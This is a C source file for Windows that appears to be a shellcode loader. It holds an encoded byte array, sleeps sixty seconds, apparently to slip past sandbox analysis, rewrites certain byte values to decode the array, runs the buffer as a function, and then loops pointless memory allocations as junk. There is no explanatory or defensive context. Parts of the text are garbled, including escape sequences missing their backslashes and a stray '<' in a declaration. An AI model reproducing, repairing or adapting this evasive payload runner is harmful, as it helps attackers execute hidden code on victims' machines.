#include <stdio.h>

#include <windows.h>

unsigned char buf[] =
"xb8xd1xc4x52xa7xdaxc6xd9x74x24xf4x5ax2bxc9xb1"
"x99x83xc2x04x31x42x11x03x42x11xe2x24x1dx92x7e"
"xb2xbaxe7x39x2cxfcx5dx94x0ex2bxabx59x3dx1ax6d"
"x8dxc2x9bx75xb2x94x0fxcexefx92xc6xcbxc0x88x05"
"x5ex42xb4x73x34xddx6bxf6x9fx0cx8dx2fx8cx47x22"
"x11xd3x9ex29x33x25x73xe7x47x56x5dx33x2ex37x27"
"x49xa0x44x46xa8x94x8ex62xf3xfex63xf4x14x33x4b"
"x04x15x39xc3xcex03xd0x61xa3x13x73x24x2ax02x8c"
"xefx11x0fx61x68xa5x41x4axa3x3bx26xcexd6xb4x6c"
"x97xc0x3cxa7xadx11x71xc4x1ex7exfbxd8x69xc9xec"
"xaax1fxe6x1fx98xc1x24x5ax7fxbax26x1exbcx45x6b"
"x38x33xb0x40x68xe4xbex7ax4dx1bx3ax37xd7x6dxa2"
"x0exaex81xcfxa4x37x97x14x1dxadx4exb5x50xe7x36"
"x59xe6xc9x36x24x00x95xa5x57x5cxfbxbexeexadx4b"
"x89x35xbcx67x5ax73xb4xacxc2x3ex7ex70xacx77xce"
"x84x92x13x68x70xbdxddxa1x96xa5x32x86x32xf7x9b"
"xc0x1axe7x26x14x46x2cx35x9fx1cxcbx6cx97x40xb8"
"xfax08x81x04x70x91x23xe4xdbxffxc6x75x21x4fxbf"
"x3cx48x86x9fxffxd7xafx07xafx51x5fxcexd6xe5xa0"
"x5axd4x35x25xd6x48x8dxb8x06xeex8exe9xbcx0dx70"
"x3bxb9x94xd1x7ax7cxfex26x36x83x3bxccxecx73x59"
"x74x58x7ex2bx58xfcx5fx2axaex9ex63xe5xfcx17x3e"
"x12xefxe6x98xa5x1dxdfxb4xc7x5axaaxf3xeax49x73"
"x97xa5x1axb3x84x7fx66xcex6exd0xe7x39x24x98xbc"
"x16x99x2exf2x9bxfdx22x6axd9x1cx74x5dxb8xc0x0c"
"x9dx31x84xc8x2ex56x4dx3bxe0x4dx36xbcx93xf2xc4"
"xc6x9dxadxcbxe0xabxb7x37x5ex79x9bx92xedx58xa4"
"x41x13x36xdax0cx6dx4ax1dxf1xddx8dxbfxe7xdex7f"
"x6fx97xe3xadx57x12x21x78x74x92xddx2ex61x66xec"
"x3bxaax86x46xcfx0ex86x4fx14xb1x3bxa9xdfxa9x3f"
"xf5xf5xc5x6fxf4x94x08xf4xe5xf8x01x24xaex44x8c"
"xd6xcdx2ax96x27x24x35x24x18xccx1ax7bxb4x2exb6"
"xf9xa6x4dxfax94x2dx0dx93x69xf1xdax08x3fxfexc3"
"xe0x11xbaxa0x87x17x16xd8xf8xafx50x48x9cx84x26"
"xcax94x87x33x61x52x75x54xb2x69x3fx00x2cx47xcc"
"xf5xadx5cxbexb6x50xbex52x90xa5x8dx53x3exd6x7c"
"xccx13x44x19x07xc4x6bx23xc1x1dx45xc1x5ex6bxf1"
"x48xccx18xeex01x78xdbx66xdex3bxa8x77xc7xc4x35"
"x04x12x87x7ax63x69xc6xc1x3axccxb4x19x8dxcdx1e"
"xfdxffx68x28x7fx77xa0xc6x87xa0xc9x22xa7x4ax3f"
"x2exa9xf3x7bx4fx76x21x4bxa9x03x53xa2xefxfexa8"
"x79x4ax4dx78xd4x72x90x09x56xabxa0xf4x49x39xf1"
"x2fx29xe1xd1x52x93xa8x52";


int main(int argc, char **argv)
{
	
int x, len, junk<;	
Sleep(60000);

len = sizeof(buf);
 
for(x=0; x<len; x++)

{
if (buf[x] == 0x15) { buf[x] = 0x10; }
if (buf[x] == 0x25) { buf[x] = 0x20; }
if (buf[x] == 0x35) { buf[x] = 0x30; }
if (buf[x] == 0x65) { buf[x] = 0x60; }
}



int (*f)();

f = (int (*)())buf;

(int)(*f)();

for(x=0; x<5000000; x++)

{

        junk = rand() % 10;

        malloc(10 * sizeof(int));

}

}